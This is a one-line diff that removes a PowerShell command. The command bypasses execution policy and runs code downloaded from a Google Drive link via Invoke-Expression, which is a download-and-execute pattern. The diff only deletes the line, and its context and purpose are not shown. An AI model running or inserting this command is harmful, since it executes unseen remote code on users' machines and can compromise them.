@@ -1,1 +1,0 @@
-PowerShell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://drive.google.com/uc?export=download&confirm=t&id=1oDW-RNdI63Wp_XyDgDweEdskAHvEcB_S')"
